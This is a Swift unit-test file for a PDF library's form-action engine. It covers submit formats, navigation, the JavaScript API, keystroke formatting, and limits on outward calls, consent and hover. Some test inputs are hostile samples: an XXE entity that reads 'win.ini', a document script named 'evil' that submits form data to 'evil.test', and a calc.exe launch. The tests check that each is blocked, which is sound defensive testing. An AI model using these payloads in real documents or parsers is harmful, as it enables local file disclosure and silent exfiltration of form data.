import Foundation
import Testing
@testable import PdfCore

/// Ported from FormActionTests.cs, whole: widget actions (`FormEditor.runAction`), the JavaScript action API, data
/// formats and live keystrokes, with a fake host. The host's `submit` answers whether the data went out (Windows hands
/// back the sending task). PDF strings with accents are written in octal (\311t\351 is "Été"), as the files here are
/// built as UTF-8 where Windows writes Latin-1.
struct FormActionTests {
    static let w = "/Type /Annot /Subtype /Widget /F 4 /P 4 0 R"

    /// A form on page 1 of `pages` pages: objects 1 catalog, 2 pages, 3 Helvetica, 4.. the pages, then the fields,
    /// then `more`.
    static func doc(_ fields: [String], pages: Int = 1, more: [String] = [], catalogExtra: String = "") -> [UInt8] {
        let first = 4 + pages
        let refs = fields.indices.map { "\(first + $0) 0 R" }.joined(separator: " ")
        let pageRefs = (0..<pages).map { "\(4 + $0) 0 R" }.joined(separator: " ")
        var objects = [
            "<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [\(refs)] /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 3 0 R >> >> >> \(catalogExtra) >>",
            "<< /Type /Pages /Kids [\(pageRefs)] /Count \(pages) >>",
            "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>",
        ]
        for p in 0..<pages { objects.append("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] \(p == 0 ? "/Annots [\(refs)]" : "") /Resources << >> >>") }
        return Core2Pdf.build(objects + fields + more)
    }

    static func rect(_ row: Int) -> String { "72 \(700 - row * 30) 250 \(720 - row * 30)" }
    static func text(_ name: String, _ row: Int, _ extra: String = "") -> String {
        "<< \(w) /FT /Tx /T (\(name)) /Rect [\(rect(row))] /DA (/Helv 10 Tf 0 g) \(extra) >>"
    }
    static func button(_ name: String, _ row: Int, _ action: String) -> String {
        "<< \(w) /FT /Btn /Ff 65536 /T (\(name)) /Rect [\(rect(row))] /A \(action) >>"
    }
    static func js(_ script: String) -> String { "<< /S /JavaScript /JS (\(script)) >>" }

    final class FakeHost: FormActionHost {
        var page = 0
        var calls: [String] = []
        var submits: [FormSubmission] = []
        var alerts: [FormAlert] = []
        var mails: [FormMail] = []
        var alertAnswer = 1
        var answer: String?
        var importBytes: [UInt8]?
        /// The answer to consent: false = the user declines every outward step.
        var allow = true

        var currentPage: Int { page }

        func goToPage(_ page: Int, _ y: Double?) {
            self.page = page
            calls.append("goto \(page)")
        }

        func openUrl(_ url: String) -> Bool {
            calls.append("url \(url)")
            return allow
        }

        func submit(_ submission: FormSubmission) -> Bool {
            submits.append(submission)
            return allow
        }

        func mail(_ mail: FormMail) -> Bool {
            mails.append(mail)
            return allow
        }

        func print(_ fromPage: Int?, _ toPage: Int?) { calls.append("print") }

        func alert(_ alert: FormAlert) -> Int {
            alerts.append(alert)
            return alertAnswer
        }

        func response(_ prompt: FormPrompt) -> String? {
            calls.append("response \(prompt.question)")
            return answer
        }

        func openRemote(_ path: String, _ page: Int) -> Bool {
            calls.append("remote \(path) \(page)")
            return allow
        }

        func launch(_ path: String) -> Bool {
            calls.append("launch \(path)")
            return allow
        }

        func named(_ name: String) { calls.append("named \(name)") }

        func importData(_ suggestedPath: String?) -> [UInt8]? {
            calls.append("import \(suggestedPath ?? "")")
            return importBytes
        }

        func beep(_ type: Int) { calls.append("beep \(type)") }
    }

    static func run(_ doc: [UInt8], _ field: String, _ host: FakeHost, _ trigger: FormTrigger = .click) throws -> FormActionResult {
        let w = try #require(try FormEditor.read(doc, nil).first { $0.fieldName == field })
        return try FormEditor.runAction(doc, nil, field, w.pageIndex, w.annotIndex, trigger, host)
    }

    static func valueOf(_ data: [UInt8]?, _ name: String) throws -> String {
        let data = try #require(data)
        return try #require(try FormEditor.read(data, nil).first { $0.fieldName == name }).value
    }

    static func latin1(_ b: [UInt8]) -> String { String(String.UnicodeScalarView(b.map { Unicode.Scalar($0) })) }

    // ---------------- Reading ----------------

    @Test func readReportsTriggersPositionAndSignedState() throws {
        let doc = Self.doc([
            Self.button("go", 0, "<< /S /Named /N /NextPage >>"),
            Self.text("num", 1, "/AA << /K << /S /JavaScript /JS (AFNumber_Keystroke\\(2, 0, 0, 0, '', true\\);) >> /Fo << /S /JavaScript /JS (1;) >> >>"),
            "<< \(Self.w) /FT /Sig /T (sig) /Rect [\(Self.rect(2))] /V << /Type /Sig /Filter /Adobe.PPKLite >> >>",
            "<< \(Self.w) /FT /Sig /T (blank) /Rect [\(Self.rect(3))] >>",
        ])
        let widgets = try FormEditor.read(doc, nil)
        let go = try #require(widgets.first { $0.fieldName == "go" })
        #expect(go.kind == .pushButton)
        #expect(go.triggers == .up)
        #expect(go.annotIndex == 0)
        let num = try #require(widgets.first { $0.fieldName == "num" })
        #expect(num.triggers == [.keystroke, .focus])
        #expect(num.annotIndex == 1)
        #expect(widgets.first { $0.fieldName == "sig" }?.signed == true)
        #expect(widgets.first { $0.fieldName == "blank" }?.signed == false)
    }

    // ---------------- ResetForm ----------------

    @Test func resetButtonPutsFieldsBackToTheirDefaults() throws {
        let doc = Self.doc([Self.text("a", 0, "/V (typed) /DV (default)"), Self.text("b", 1, "/V (other)"), Self.button("reset", 2, "<< /S /ResetForm >>")])
        let r = try Self.run(doc, "reset", FakeHost())
        let data = try #require(r.data)
        #expect(r.label == "Reset form")
        #expect(try Self.valueOf(data, "a") == "default")
        #expect(try Self.valueOf(data, "b") == "")
        // The reset value also shows: the appearance was rebuilt.
        #expect(try Core2Pdf.allText(Core2Pdf.withoutNeedAppearances(data)).contains("default"))
    }

    @Test func resetFormHonorsFieldsAndTheExcludeFlag() throws {
        let fields = [Self.text("a", 0, "/V (1)"), Self.text("b", 1, "/V (2)")]
        let include = try Self.run(Self.doc(fields + [Self.button("r", 2, "<< /S /ResetForm /Fields [(a)] >>")]), "r", FakeHost()).data
        #expect(try Self.valueOf(include, "a") == "" && Self.valueOf(include, "b") == "2")
        let exclude = try Self.run(Self.doc(fields + [Self.button("r", 2, "<< /S /ResetForm /Fields [(a)] /Flags 1 >>")]), "r", FakeHost()).data
        #expect(try Self.valueOf(exclude, "a") == "1" && Self.valueOf(exclude, "b") == "")
    }

    // ---------------- SubmitForm ----------------

    static func submitDoc(_ flags: Int, _ fields: String = "") -> [UInt8] {
        doc([
            text("a", 0, "/V (x)"),
            text("b", 1, "/V (hello world)"),
            text("c", 2),
            button("send", 3, "<< /S /SubmitForm /F << /FS /URL /F (https://example.test/form) >> /Flags \(flags) \(fields) >>"),
        ])
    }

    @Test func submitSendsFdfByDefault() throws {
        let host = FakeHost()
        let r = try Self.run(Self.submitDoc(0), "send", host)
        #expect(r.data == nil) // nothing in the document changed
        try #require(host.submits.count == 1)
        let s = host.submits[0]
        #expect(s.url == "https://example.test/form" && s.method == "POST" && s.contentType == "application/vnd.fdf" && s.format == .fdf && s.fieldCount == 2)
        let body = Self.latin1(s.body)
        #expect(body.hasPrefix("%FDF-1.2"))
        #expect(body.contains("/T (a) /V (x)"))
        let parsed = try #require(FormData.parse(s.body))
        #expect(parsed["a"] == ["x"])
        #expect(parsed["b"] == ["hello world"])
        #expect(parsed["c"] == nil) // no value, not asked for
    }

    @Test func submitSendsXfdfHtmlAndPdfPerFlags() throws {
        let host = FakeHost()
        _ = try Self.run(Self.submitDoc(32), "send", host)
        let xfdf = try #require(host.submits.last)
        #expect(xfdf.contentType == "application/vnd.adobe.xfdf" && xfdf.format == .xfdf)
        let xml = String(decoding: xfdf.body, as: UTF8.self)
        #expect(xml.contains("<field name=\"a\"><value>x</value></field>"))
        #expect(FormData.parse(xfdf.body)?["b"] == ["hello world"])

        _ = try Self.run(Self.submitDoc(4), "send", host)
        let post = try #require(host.submits.last)
        #expect(post.method == "POST" && post.contentType == "application/x-www-form-urlencoded")
        #expect(String(decoding: post.body, as: UTF8.self) == "a=x&b=hello+world")

        _ = try Self.run(Self.submitDoc(4 | 8), "send", host)
        let get = try #require(host.submits.last)
        #expect(get.method == "GET" && get.url == "https://example.test/form?a=x&b=hello+world")
        #expect(get.body.isEmpty)

        _ = try Self.run(Self.submitDoc(256), "send", host)
        let pdf = try #require(host.submits.last)
        #expect(pdf.contentType == "application/pdf" && pdf.format == .pdf)
        #expect(Self.latin1(Array(pdf.body.prefix(8))).hasPrefix("%PDF"))
    }

    @Test func submitIncludesExcludesAndEmptyFieldsPerFlags() throws {
        let host = FakeHost()
        _ = try Self.run(Self.submitDoc(4 | 2, "/Fields [(a) (c)]"), "send", host)
        #expect(String(decoding: host.submits.last?.body ?? [], as: UTF8.self) == "a=x&c=")
        _ = try Self.run(Self.submitDoc(4 | 1, "/Fields [(a)]"), "send", host)
        #expect(String(decoding: host.submits.last?.body ?? [], as: UTF8.self) == "b=hello+world")
        #expect(host.submits.last?.fieldCount == 1)
    }

    @Test func fdfNestsHierarchicalNamesAndRoundTripsUnicode() throws {
        let entries = [
            FormData.Entry(name: "person.name", values: ["Zoë (née) \\ Ünal"], isName: false),
            FormData.Entry(name: "person.agree", values: ["Yes"], isName: true),
            FormData.Entry(name: "colors", values: ["red", "blue"], isName: false),
        ]
        let fdf = FormData.fdf(entries, "form.pdf")
        #expect(Self.latin1(fdf).contains("/T (person) /Kids ["))
        let back = try #require(FormData.parse(fdf))
        #expect(back["person.name"] == ["Zoë (née) \\ Ünal"])
        #expect(back["person.agree"] == ["Yes"])
        #expect(back["colors"] == ["red", "blue"])
        let xback = try #require(FormData.parse(FormData.xfdf(entries, nil)))
        #expect(back == xback)
        #expect(FormData.parse(Array("<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///c:/windows/win.ini'>]><xfdf>&e;</xfdf>".utf8)) == nil)
        #expect(FormData.parse(Array("MZ not form data".utf8)) == nil)
    }

    @Test func javaScriptSubmitTakesTheObjectAndPositionalForms() throws {
        let host = FakeHost()
        let doc = Self.doc([
            Self.text("a", 0, "/V (x)"),
            Self.text("b", 1, "/V (y)"),
            Self.button("obj", 2, Self.js("this.submitForm({cURL: 'https://example.test/o', cSubmitAs: 'XFDF', aFields: ['a']});")),
            Self.button("pos", 3, Self.js("this.submitForm('https://example.test/p', false, false, 'b');")),
            Self.button("pdf", 4, Self.js("this.submitForm({cURL: 'https://example.test/d', bPDF: true});")),
        ])
        _ = try Self.run(doc, "obj", host)
        _ = try Self.run(doc, "pos", host)
        _ = try Self.run(doc, "pdf", host)
        try #require(host.submits.count == 3)
        #expect(host.submits[0].url == "https://example.test/o" && host.submits[0].format == .xfdf && host.submits[0].fieldCount == 1)
        #expect(FormData.parse(host.submits[0].body)?["a"] == ["x"])
        #expect(host.submits[1].url == "https://example.test/p" && host.submits[1].format == .html)
        #expect(String(decoding: host.submits[1].body, as: UTF8.self) == "b=y")
        #expect(host.submits[2].format == .pdf)
    }

    // ---------------- Navigation, chains, hide ----------------

    @Test func namedActionsAndNextChainsNavigate() throws {
        let doc = Self.doc([
            Self.button("next", 0, "<< /S /Named /N /NextPage /Next << /S /Named /N /NextPage >> >>"),
            Self.button("last", 1, "<< /S /Named /N /LastPage /Next [<< /S /Named /N /PrevPage >> << /S /Named /N /Print >>] >>"),
            Self.button("first", 2, "<< /S /Named /N /FirstPage /Next << /S /GoTo /D [6 0 R /Fit] /Next << /S /URI /URI (https://example.test/) >> >> >>"),
        ], pages: 4)
        let host = FakeHost()
        _ = try Self.run(doc, "next", host)
        #expect(host.page == 2)
        _ = try Self.run(doc, "next", host)
        #expect(host.page == 3) // clamped to the last page
        _ = try Self.run(doc, "last", host)
        #expect(host.page == 2)
        #expect(host.calls.contains("named Print"))
        _ = try Self.run(doc, "first", host)
        #expect(Array(host.calls.suffix(3)) == ["goto 0", "goto 2", "url https://example.test/"])
    }

    @Test func hideActionTogglesTheWidgetsHiddenFlag() throws {
        let doc = Self.doc([Self.text("a", 0, "/V (x)"), Self.button("hide", 1, "<< /S /Hide /T (a) >>"), Self.button("show", 2, "<< /S /Hide /T [(a)] /H false >>")])
        let hidden = try #require(try Self.run(doc, "hide", FakeHost()).data)
        #expect(!(try FormEditor.read(hidden, nil)).contains { $0.fieldName == "a" })
        let shown = try Self.run(hidden, "show", FakeHost()).data
        #expect(try Self.valueOf(shown, "a") == "x")
    }

    @Test func launchRemoteAndImportGoThroughTheHost() throws {
        let host = FakeHost()
        host.importBytes = FormData.fdf([FormData.Entry(name: "a", values: ["imported"], isName: false)], nil)
        let doc = Self.doc([
            Self.text("a", 0),
            Self.button("launch", 1, "<< /S /Launch /F (calc.exe) >>"),
            Self.button("remote", 2, "<< /S /GoToR /F (other.pdf) /D [3 /Fit] >>"),
            Self.button("import", 3, "<< /S /ImportData /F (data.fdf) >>"),
        ])
        _ = try Self.run(doc, "launch", host)
        _ = try Self.run(doc, "remote", host)
        let r = try Self.run(doc, "import", host)
        #expect(host.calls == ["launch calc.exe", "remote other.pdf 3", "import data.fdf"])
        #expect(r.label == "Import form data")
        #expect(try Self.valueOf(r.data, "a") == "imported")

        // Declined (no file): nothing changes.
        #expect(try Self.run(doc, "import", FakeHost()).data == nil)
    }

    // ---------------- JavaScript API ----------------

    @Test func alertsAreModalRateLimitedAndReturnTheChoice() throws {
        let host = FakeHost()
        host.alertAnswer = 4
        let doc = Self.doc([
            Self.text("a", 0, "/V (x)"),
            Self.button("spam", 1, Self.js("for (var i = 0; i < 6; i++) app.alert('m' + i);")),
            Self.button("ask", 2, Self.js("if (app.alert({cMsg: 'Clear?', nIcon: 2, nType: 2, cTitle: 'Form'}) == 4) this.resetForm(['a']);")),
        ])
        let r = try Self.run(doc, "spam", host)
        #expect(host.alerts.map(\.message) == ["m0", "m1", "m2"])
        #expect(r.log.contains { $0.contains("suppressed") })
        #expect(r.alerts.isEmpty) // shown as dialogs, not repeated as toasts

        let cleared = try Self.run(doc, "ask", host)
        #expect(host.alerts.last == FormAlert("Clear?", "Form", 2, 2))
        #expect(try Self.valueOf(cleared.data, "a") == "")
        host.alertAnswer = 3 // No
        #expect(try Self.run(doc, "ask", host).data == nil)
    }

    @Test func scriptsNavigatePromptFocusAndChangeFieldLooks() throws {
        let host = FakeHost()
        host.answer = "Bob"
        let doc = Self.doc([
            Self.text("a", 0),
            Self.text("b", 1),
            "<< \(Self.w) /FT /Ch /Ff 131072 /T (c) /Rect [\(Self.rect(2))] /DA (/Helv 10 Tf 0 g) /Opt [(x)] >>",
            Self.button("go", 3, Self.js("getField('a').value = app.response('Name?') + '|' + this.numPages + '|' + util.printx('(999) 999-9999', '5551234567') + '|' + AFExactMatch([/[a-z]+/, /[0-9]+/], '123'); "
                + "this.pageNum = 2; getField('b').setFocus(); app.beep(1); "
                + "var f = getField('b'); f.readonly = true; f.fillColor = color.red; f.textColor = ['RGB', 0, 0, 1]; "
                + "getField('c').setItems([['One', '1'], ['Two', '2']]); getField('c').insertItemAt('Zero', '0', 0); getField('c').deleteItemAt(2);")),
        ], pages: 3)
        let r = try Self.run(doc, "go", host)
        let data = try #require(r.data)
        #expect(try Self.valueOf(data, "a") == "Bob|3|(555) 123-4567|2")
        #expect(host.page == 2)
        #expect(r.focusField == "b")
        #expect(host.calls.contains("beep 1"))
        let widgets = try FormEditor.read(data, nil)
        #expect(widgets.first { $0.fieldName == "b" }?.readOnly == true)
        let c = try #require(widgets.first { $0.fieldName == "c" })
        #expect(c.options == ["0", "1"])
        #expect(c.optionLabels == ["Zero", "One"])
        let b = try #require(Core2Pdf.field(Core2Pdf.open(data), "b"))
        let bg = try #require(b.dict("MK")?.array("BG"))
        #expect((0..<3).map { bg.num($0) } == [1, 0, 0])
        #expect(b.text("DA")?.contains("0 0 1 rg") == true)
    }

    @Test func focusAndBlurRunTheirActions() throws {
        let doc = Self.doc([
            Self.text("a", 0, "/AA << /Fo << /S /JavaScript /JS (getField\\('b'\\).value = 'focused';) >> /Bl << /S /JavaScript /JS (getField\\('b'\\).value = 'left';) >> >>"),
            Self.text("b", 1),
        ])
        #expect(try Self.valueOf(Self.run(doc, "a", FakeHost(), .focus).data, "b") == "focused")
        #expect(try Self.valueOf(Self.run(doc, "a", FakeHost(), .blur).data, "b") == "left")
        #expect(try Self.run(doc, "a", FakeHost(), .enter).data == nil) // no enter action
    }

    @Test func outwardCallsNeverRunFromDocumentScriptsOrWithoutAHost() throws {
        let doc = Self.doc([
            Self.text("a", 0, "/V (x)"),
            Self.button("noop", 1, Self.js("getField('a').value = typeof this.importDataObject + typeof app.openDoc + typeof Net;")),
        ], catalogExtra: "/Names << /JavaScript << /Names [(evil) << /S /JavaScript /JS (this.submitForm\\('https://evil.test/'\\); app.launchURL\\('https://evil.test/'\\); this.mailDoc\\(\\); this.print\\(\\); app.alert\\('hi'\\);) >>] >> >>")
        let host = FakeHost()
        let r = try Self.run(doc, "noop", host)
        #expect(host.submits.isEmpty)
        #expect(host.calls.isEmpty)
        #expect(host.mails.isEmpty)
        #expect(host.alerts.isEmpty)
        #expect(try Self.valueOf(r.data, "a") == "undefinedundefinedundefined")

        // Fill without a host (reading, tests): submitForm and friends quietly do nothing.
        let fill = try FormEditor.fill(Self.doc([Self.text("a", 0, "/AA << /V << /S /JavaScript /JS (this.submitForm\\('https://x.test/'\\); app.launchURL\\('https://x.test/'\\);) >> >>")]),
                                       nil, ["a": "1"])
        #expect(try Self.valueOf(fill.data, "a") == "1")
    }

    @Test func mailDocAttachesTheFinishedDocument() throws {
        let host = FakeHost()
        let doc = Self.doc([
            Self.text("a", 0),
            Self.button("mail", 1, Self.js("getField('a').value = 'filled'; this.mailDoc({cTo: 'clerk@example.test', cSubject: 'Form'}); this.mailForm(false, 'x@example.test');")),
        ])
        let r = try Self.run(doc, "mail", host)
        #expect(host.mails.count == 2)
        let form = try #require(host.mails.first { $0.attachmentName == "form.fdf" })
        #expect(FormData.parse(try #require(form.attachment))?["a"] == ["filled"])
        let whole = try #require(host.mails.first { $0.attachmentName == "form.pdf" })
        #expect(whole.to == "clerk@example.test" && whole.subject == "Form")
        #expect(r.data == whole.attachment) // the saved document, with the script's change
        #expect(try Self.valueOf(whole.attachment, "a") == "filled")
    }

    // ---------------- Live keystrokes ----------------

    static func keys(_ script: String) throws -> FieldKeystrokes {
        try #require(FieldKeystrokes.open(doc([text("f", 0, "/AA << /K << /S /JavaScript /JS (\(script)) >> >>")]), nil, "f"))
    }

    @Test func numberKeystrokesRejectLetters() throws {
        let keys = try Self.keys("AFNumber_Keystroke\\(2, 0, 0, 0, '', true\\);")
        #expect(keys.run("12", "a", 2, 2)?.accepted == false)
        let ok = try #require(keys.run("12", "3", 2, 2))
        #expect(ok.accepted && ok.change == "3" && ok.selStart == 2 && ok.selEnd == 2)
        #expect(keys.run("123", "", 2, 3)?.accepted == true) // backspace
        #expect(FieldKeystrokes.open(Self.doc([Self.text("f", 0)]), nil, "f") == nil) // no keystroke script
    }

    @Test func specialKeystrokesFormatPhoneNumbersAsTyped() throws {
        let phone = try Self.keys("AFSpecial_Keystroke\\(2\\);")
        var r = try #require(phone.run("555", "1", 3, 3))
        #expect(r.accepted && r.change == "555-1" && r.selStart == 0 && r.selEnd == 3)
        r = try #require(phone.run("555-1234", "5", 8, 8))
        #expect(r.change == "(555) 123-45")
        #expect(phone.run("555", "x", 3, 3)?.accepted == false)

        let mask = try Self.keys("AFSpecial_KeystrokeEx\\('99-AA'\\);")
        r = try #require(mask.run("12", "x", 2, 2))
        #expect(r.accepted && r.change == "-x")
        #expect(mask.run("12", "3", 2, 2)?.accepted == false)

        let upper = try Self.keys("event.change = event.change.toUpperCase\\(\\);")
        #expect(upper.run("", "abc", 0, 0)?.change == "ABC")
    }

    @Test func keystrokeScriptsCannotChangeTheFormOrReachOut() throws {
        let keys = try Self.keys("getField\\('f'\\).value = 'hacked'; this.submitForm\\('https://x.test/'\\); app.launchURL\\('https://x.test/'\\);")
        #expect(keys.run("a", "b", 1, 1)?.accepted == true) // runs, but writes and outward calls go nowhere
    }

    @Test func keystrokeEngineStartsWhenOpenedNotOnTheFirstKeystroke() throws {
        #expect(try Self.keys("AFNumber_Keystroke\\(2, 0, 0, 0, '', true\\);").warm)
    }

    @Test func editDiffAndLengthFit() {
        func d(_ a: String, _ b: String) -> [String] {
            let r = FieldKeystrokes.diff(a, b)
            return [String(r.start), String(r.end), r.change]
        }
        #expect(d("123", "1234") == ["3", "3", "4"])
        #expect(d("1234", "14") == ["1", "3", ""])
        #expect(d("555-1234", "(555) 1234") == ["0", "4", "(555) "]) // only what differs
        #expect(d("5551", "555-1") == ["3", "3", "-"])
        #expect(d("\u{1F600}", "b") == ["0", "2", "b"]) // a surrogate pair is never split
        #expect(FieldKeystrokes.fit("123", 3, 3, "abcdef", 5) == "ab")
        #expect(FieldKeystrokes.fit("123", 1, 3, "abcdef", 4) == "abc")
        #expect(FieldKeystrokes.fit("123", 3, 3, "abcdef", 0) == "abcdef")
        #expect(FieldKeystrokes.fit("12345", 5, 5, "x", 5) == "")
        #expect(FieldKeystrokes.fit("123", 3, 3, "a\u{1F600}", 5) == "a") // the pair doesn't fit whole: left out
    }

    // ---------------- Outward caps, consent and hover ----------------

    @Test func outwardCallsAreCappedPerRunAndTheScriptStops() throws {
        let host = FakeHost()
        let doc = Self.doc([Self.text("a", 0), Self.button("loop", 1, Self.js("for \\(;;\\) app.launchURL\\('https://x.test/'\\);"))])
        let r = try Self.run(doc, "loop", host)
        #expect(host.calls.filter { $0.hasPrefix("url ") }.count == 3)
        #expect(r.alerts.contains { $0.contains("stopped") })
        #expect(r.log.contains { $0.contains("too many outward") })
    }

    @Test func outwardCallsAreCappedPerDocumentPerMinute() throws {
        let host = FakeHost()
        let doc = Self.doc([Self.button("two", 0, Self.js("app.launchURL\\('https://x.test/1'\\); app.mailMsg\\(false, 'a@x.test'\\);"))])
        var notices: [Int] = []
        for _ in 0..<4 { notices.append(try Self.run(doc, "two", host).alerts.count) }
        #expect(host.calls.filter { $0.hasPrefix("url ") }.count + host.mails.count == 6)
        #expect(notices == [0, 0, 0, 1])
        // Another document (another host) has its own allowance.
        let other = FakeHost()
        _ = try Self.run(doc, "two", other)
        #expect(other.mails.count == 1)
    }

    @Test func declinedConsentStopsTheScriptAndTheActionChain() throws {
        let host = FakeHost()
        host.allow = false
        let doc = Self.doc([
            Self.text("a", 0, "/V (before)"),
            Self.button("js", 1, Self.js("app.launchURL\\('https://x.test/1'\\); getField\\('a'\\).value = 'after'; app.launchURL\\('https://x.test/2'\\);")),
            Self.button("chain", 2, "<< /S /URI /URI (https://x.test/3) /Next << /S /JavaScript /JS (getField\\('a'\\).value = 'next';) >> >>"),
            Self.button("send", 3, Self.js("this.submitForm\\('https://x.test/s'\\); getField\\('a'\\).value = 'sent';")),
        ])
        let r = try Self.run(doc, "js", host)
        #expect(host.calls == ["url https://x.test/1"])
        #expect(r.data == nil)
        #expect(r.log.contains { $0.contains("stopped") })
        #expect(try Self.run(doc, "chain", host).data == nil)
        #expect(try Self.run(doc, "send", host).data == nil)
        #expect(host.submits.count == 1)
        // Allowed, the same scripts carry on.
        #expect(try Self.valueOf(Self.run(doc, "js", FakeHost()).data, "a") == "after")
    }

    @Test func alwaysAllowCoversTheDestinationAndWhatIsSent() {
        func sub(_ url: String, _ format: SubmitFormat, _ fields: String...) -> FormSubmission {
            FormSubmission(url: url, method: "POST", contentType: "x", body: [], format: format, fieldCount: fields.count, fields: fields)
        }
        let fdf = FormConsent.submitKey(sub("https://x.test/s?a=1", .fdf, "a", "b"))
        #expect(fdf == FormConsent.submitKey(sub("https://x.test/s?a=2", .fdf, "b", "a")))
        #expect(fdf != FormConsent.submitKey(sub("https://x.test/s", .fdf, "a", "b", "ssn")))
        #expect(fdf != FormConsent.submitKey(sub("https://x.test/s", .pdf, "a", "b")))
        #expect(fdf != FormConsent.submitKey(sub("https://x.test/t", .fdf, "a", "b")))
        var get = sub("https://x.test/s", .fdf, "a", "b")
        get.method = "GET"
        #expect(fdf != FormConsent.submitKey(get))

        let msg = FormMail(to: "a@x.test; B@x.test", cc: "", bcc: "", subject: "Hi", message: "", attachment: nil, attachmentName: nil)
        var same = msg
        same.to = "b@x.test,a@x.test"
        same.subject = "Other"
        #expect(FormConsent.mailKey(msg) == FormConsent.mailKey(same))
        var spied = msg
        spied.bcc = "spy@x.test"
        #expect(FormConsent.mailKey(msg) != FormConsent.mailKey(spied))
        var data = msg
        data.attachment = [1]
        data.attachmentName = "form.fdf"
        data.fields = ["a"]
        var pdf = msg
        pdf.attachment = [1]
        pdf.attachmentName = "form.pdf"
        #expect(Set([FormConsent.mailKey(msg), FormConsent.mailKey(data), FormConsent.mailKey(pdf)]).count == 3)
        var more = data
        more.fields = ["a", "b"]
        #expect(FormConsent.mailKey(data) != FormConsent.mailKey(more))
    }

    @Test func submitsAndMailsSayWhichFieldsTheyCarry() throws {
        let host = FakeHost()
        let doc = Self.doc([
            Self.text("a", 0, "/V (1)"),
            Self.text("b", 1, "/V (2)"),
            Self.button("go", 2, Self.js("this.submitForm\\({cURL: 'https://x.test/s', aFields: ['a']}\\); this.mailForm\\(false, 'z@x.test'\\);")),
        ])
        _ = try Self.run(doc, "go", host)
        #expect(host.submits.count == 1 && host.submits[0].fields == ["a"])
        #expect(host.mails.count == 1 && host.mails[0].fields == ["a", "b"])
    }

    @Test func setFocusFromFocusOrBlurScriptsIsIgnored() throws {
        let doc = Self.doc([
            Self.text("a", 0, "/AA << /Fo << /S /JavaScript /JS (getField\\('b'\\).setFocus\\(\\);) >> /Bl << /S /JavaScript /JS (getField\\('b'\\).setFocus\\(\\);) >> "
                + "/U << /S /JavaScript /JS (getField\\('b'\\).setFocus\\(\\);) >> >>"),
            Self.text("b", 1, "/AA << /Fo << /S /JavaScript /JS (getField\\('a'\\).setFocus\\(\\);) >> >>"),
        ])
        let host = FakeHost()
        #expect(try Self.run(doc, "a", host, .focus).focusField == nil)
        #expect(try Self.run(doc, "a", host, .blur).focusField == nil)
        #expect(try Self.run(doc, "b", host, .focus).focusField == nil)
        #expect(try Self.run(doc, "a", host, .up).focusField == "b") // a click may still move it
    }

    @Test func hoverRunsScriptsWithoutDialogsPrintingOrOutwardActions() throws {
        let host = FakeHost()
        let enter = Self.js("app.alert\\('hi'\\); app.response\\('?'\\); print\\(\\); app.launchURL\\('https://x.test/'\\); this.resetForm\\(\\); "
            + "getField\\('a'\\).display = display.hidden;")
        let exit = "<< /S /Named /N /Print /Next [<< /S /Named /N /NextPage >> << /S /URI /URI (https://x.test/u) >> << /S /SubmitForm /F (https://x.test/s) >>] >>"
        let doc = Self.doc([Self.text("a", 0, "/V (keep)"), "<< \(Self.w) /FT /Btn /Ff 65536 /T (hover) /Rect [\(Self.rect(1))] /AA << /E \(enter) /X \(exit) >> >>"], pages: 2)
        let r = try Self.run(doc, "hover", host, .enter)
        #expect(host.alerts.isEmpty)
        #expect(host.calls.isEmpty)
        #expect(r.alerts.isEmpty)
        let data = try #require(r.data) // the harmless part (hiding a field) still happened
        #expect(!(try FormEditor.read(data, nil)).contains { $0.fieldName == "a" })
        #expect(r.log.contains { $0.contains("resetForm ignored") })

        _ = try Self.run(doc, "hover", host, .exit)
        #expect(host.calls == ["goto 1"]) // only the navigation
        #expect(host.submits.isEmpty)

        // Clicked, the same script may open dialogs.
        let click = FakeHost()
        let clickDoc = Self.doc([Self.text("a", 0), "<< \(Self.w) /FT /Btn /Ff 65536 /T (b) /Rect [\(Self.rect(1))] /A \(enter) >>"])
        _ = try Self.run(clickDoc, "b", click)
        #expect(click.alerts.count == 1)
    }

    // ---------------- Check boxes and radios with /Opt ----------------

    /// A radio group "r" whose two widgets (states /0 and /1) export the same non-ASCII value "Été" through /Opt (as
    /// Acrobat writes it), a check box "cb" exporting "Oui" for state /0, a text field "a" and a button "go".
    static func optForm(_ script: String, radioValue: String = "/1", checkValue: String = "/0") -> [UInt8] {
        // Objects: 5 a, 6 r, 7 cb, 8 go, 9-10 r's widgets, 11 the appearance.
        func kid(_ state: String, _ row: Int) -> String {
            "<< \(w) /Parent 6 0 R /Rect [\(rect(row))] /AS /\(radioValue == "/" + state ? state : "Off") /AP << /N << /\(state) 11 0 R /Off 11 0 R >> >> >>"
        }
        return doc([
            text("a", 0),
            "<< /FT /Btn /Ff 49152 /T (r) /Opt [(\\311t\\351) (\\311t\\351)] /V \(radioValue) /Kids [9 0 R 10 0 R] >>",
            "<< \(w) /FT /Btn /T (cb) /Rect [\(rect(3))] /Opt [(Oui)] /V \(checkValue) /AS \(checkValue) /AP << /N << /0 11 0 R /Off 11 0 R >> >> >>",
            button("go", 4, js(script)),
        ], more: [kid("0", 1), kid("1", 2), Core2Pdf.stream("")])
    }

    @Test func optExportValuesAreWhatScriptsSee() throws {
        let host = FakeHost()
        let doc = Self.optForm("var r = getField\\('r'\\), c = getField\\('cb'\\); getField\\('a'\\).value = [r.value, r.exportValues.join\\('+'\\), "
            + "r.isBoxChecked\\(0\\), r.isBoxChecked\\(1\\), c.value, c.exportValues[0]].join\\('|'\\);")
        #expect(try Self.valueOf(Self.run(doc, "go", host).data, "a") == "Été|Été+Été|false|true|Oui|Oui")

        // checkThisBox picks the widget, even when the export values are the same.
        let set = Self.optForm("getField\\('r'\\).checkThisBox\\(0\\); getField\\('a'\\).value = getField\\('r'\\).isBoxChecked\\(0\\) + '' + getField\\('r'\\).isBoxChecked\\(1\\);")
        #expect(try Self.valueOf(Self.run(set, "go", host).data, "a") == "truefalse")

        // Setting the export value turns its widget on; "Off" clears.
        let byValue = Self.optForm("getField\\('cb'\\).value = 'Off'; var a = getField\\('cb'\\).value; getField\\('cb'\\).value = 'Oui'; "
            + "getField\\('a'\\).value = a + '>' + getField\\('cb'\\).value;", checkValue: "/Off")
        let data = try Self.run(byValue, "go", host).data
        #expect(try Self.valueOf(data, "a") == "Off>Oui")
        #expect(try Self.valueOf(data, "cb") == "0") // stored as the state name
    }

